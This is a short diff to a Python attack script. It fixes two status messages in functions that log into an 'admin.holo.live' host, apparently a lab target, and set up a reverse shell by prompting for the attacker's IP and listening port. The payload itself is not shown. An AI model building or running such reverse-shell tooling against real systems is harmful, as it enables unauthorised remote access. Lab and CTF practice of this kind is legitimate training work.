@@ -4,7 +4,7 @@ import argparse
 
 def login(creds, url, session):
     
-    print("(+) Loging in.")
+    print("(+) Logging in.")
 
     login_page = url + "action_page.php"    
     hostname = {"Host" : "admin.holo.live"}
@@ -26,7 +26,7 @@ def login(creds, url, session):
 
 def shell(url, hostname, session):
 
-    print("(+) Getting a reverse shell...")
+    print("(+) Getting a reverse shell!")
 
     lhost = input("Enter your ip address: ")
     lport = input("Enter your listening port: ")
